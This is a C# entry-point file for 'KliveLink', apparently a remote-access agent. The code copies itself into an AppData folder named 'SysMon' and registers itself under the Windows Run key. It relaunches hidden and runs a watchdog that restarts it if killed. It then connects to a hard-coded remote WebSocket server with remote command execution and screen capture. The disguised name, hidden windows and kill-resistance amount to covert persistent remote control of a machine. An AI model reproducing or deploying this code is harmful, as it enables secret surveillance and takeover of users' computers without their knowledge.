using System.Drawing;
using KliveLink.Agent;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using Microsoft.Win32;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;

namespace KliveLink
{

    internal static class Program
    {
        private const string DefaultServerUri = "ws://klive.dev:5100/klivelink";
        private const string MutexName = "Global\\SysMonWatchdog";
        private static NotifyIcon? _trayIcon;
        private static KliveLinkClient? _client;

        [STAThread]
        static void Main(string[] args)
        {
            // If launched with --watchdog, run as a watchdog that restarts the main process
            if (args.Contains("--watchdog"))
            {
                RunWatchdog(args.Where(a => a != "--watchdog").ToArray());
                return;
            }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Move app to AppData and set auto-start if first launch
            string currentPath = Environment.ProcessPath!;
            string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SysMon");
            string targetPath = Path.Combine(targetDir, Path.GetFileName(currentPath));
            if (currentPath != targetPath)
            {
                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
                string sourceDir = Path.GetDirectoryName(currentPath);
                foreach (string file in Directory.GetFiles(sourceDir))
                {
                    string destFile = Path.Combine(targetDir, Path.GetFileName(file));
                    File.Copy(file, destFile, true);
                }
                // Set auto-start
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue("KL", targetPath);
                    }
                }
                // Launch new instance invisibly
                Process.Start(new ProcessStartInfo
                {
                    FileName = targetPath,
                    Arguments = string.Join(" ", args.Select(arg => $"\"{arg}\"")),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                return;
            }

            // Launch watchdog process to restart us if killed
            StartWatchdog(args);

            // Parse arguments
            string serverUri = DefaultServerUri;
            string authToken = "";
            string agentId = Environment.MachineName + "-" + Environment.UserName;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLower())
                {
                    case "--server" when i + 1 < args.Length:
                        serverUri = args[++i];
                        break;
                    case "--token" when i + 1 < args.Length:
                        authToken = args[++i];
                        break;
                    case "--agentid" when i + 1 < args.Length:
                        agentId = args[++i];
                        break;
                }
            }

            // Step 3: Start the WebSocket client on a background thread
            var executor = new CommandExecutor();
            var screenCapture = new ScreenCaptureService();
            _client = new KliveLinkClient(serverUri, agentId, authToken, executor, screenCapture);
            _client.OnLog += (msg) => Console.WriteLine(msg);

            var cts = new CancellationTokenSource();
            _ = Task.Run(() => _client.ConnectAsync(cts.Token));

            // Step 4: Run the WinForms message loop (keeps tray icon alive)
            Application.Run();

            // Cleanup
            cts.Cancel();
            _client.Dispose();
            _trayIcon?.Dispose();
        }

        /// <summary>
        /// Launches a separate copy of this exe as a watchdog process.
        /// The watchdog monitors the main process and restarts it if terminated.
        /// </summary>
        private static void StartWatchdog(string[] args)
        {
            try
            {
                string exePath = Environment.ProcessPath!;
                string watchdogArgs = "--watchdog " + string.Join(" ", args.Select(a => $"\"{a}\""));
                Process.Start(new ProcessStartInfo
                {
                    FileName = exePath,
                    Arguments = watchdogArgs,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
        }

        /// <summary>
        /// Watchdog mode: monitors the main process and restarts it if killed.
        /// Uses a mutex to ensure only one watchdog runs at a time.
        /// </summary>
        private static void RunWatchdog(string[] args)
        {
            using var mutex = new Mutex(true, MutexName, out bool createdNew);
            if (!createdNew)
                return; // Another watchdog is already running

            string exePath = Environment.ProcessPath!;
            string mainArgs = string.Join(" ", args.Select(a => $"\"{a}\""));

            while (true)
            {
                // Find the main process (same exe, without --watchdog)
                var current = Process.GetCurrentProcess();
                var mainProcess = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(exePath))
                    .FirstOrDefault(p => p.Id != current.Id);

                if (mainProcess == null)
                {
                    // Main process is gone — restart it
                    try
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = exePath,
                            Arguments = mainArgs,
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                    }
                    catch { }

                    // Wait for it to start
                    Thread.Sleep(3000);
                }
                else
                {
                    try
                    {
                        mainProcess.WaitForExit(5000);
                    }
                    catch { }
                }
            }
        }
    }
}
